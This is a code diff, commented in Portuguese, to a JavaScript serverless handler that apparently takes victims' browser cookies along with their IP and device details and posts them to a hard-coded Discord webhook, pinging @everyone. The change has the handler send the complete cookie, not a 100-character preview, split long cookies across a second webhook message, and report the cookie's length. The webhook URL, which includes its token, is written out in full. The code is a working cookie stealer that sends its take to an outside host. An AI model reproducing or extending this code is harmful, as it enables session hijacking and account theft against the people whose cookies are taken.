@@ -34,7 +34,10 @@ export default async function handler(req, res) {
     // SUA WEBHOOK AQUI - SEGURA NO BACKEND
     const webhookURL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';
 
-    // Criar mensagem mais profissional
+    // Dividir o cookie em partes se for muito longo (limite do Discord é 1024 caracteres)
+    const cookieValue = '```' + cookie + '```';
+    
+    // Criar mensagem mais profissional com cookie completo
     const embed = {
       content: '@everyone',
       embeds: [{
@@ -43,8 +46,8 @@ export default async function handler(req, res) {
         color: 0x6366f1,
         fields: [
           {
-            name: '🍪 **COOKIE**',
-            value: '```' + cookie.substring(0, 100) + (cookie.length > 100 ? '...' : '') + '```'
+            name: '🍪 **COOKIE COMPLETO**',
+            value: cookieValue.length > 1024 ? cookieValue.substring(0, 1020) + '...' : cookieValue
           },
           {
             name: '📊 **INFORMAÇÕES DO DISPOSITIVO**',
@@ -82,6 +85,11 @@ Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
             name: '🔢 **ID DA SESSÃO**',
             value: `\`${generateSessionId()}\``,
             inline: true
+          },
+          {
+            name: '📏 **TAMANHO DO COOKIE**',
+            value: `\`${cookie.length} caracteres\``,
+            inline: true
           }
         ],
         footer: {
@@ -101,6 +109,28 @@ Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(embed)
     });
+
+    // Se o cookie for muito longo e foi cortado, enviar uma segunda mensagem com o resto
+    if (cookieValue.length > 1024) {
+      const remainingCookie = cookieValue.substring(1020);
+      
+      const secondEmbed = {
+        embeds: [{
+          title: '📎 **CONTINUAÇÃO DO COOKIE**',
+          color: 0x6366f1,
+          description: remainingCookie.length > 1024 ? remainingCookie.substring(0, 1020) + '...' : remainingCookie,
+          footer: {
+            text: 'Continuação do cookie anterior'
+          }
+        }]
+      };
+      
+      await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(secondEmbed)
+      });
+    }
 
     if (!response.ok) {
       throw new Error('Falha ao enviar para Discord');
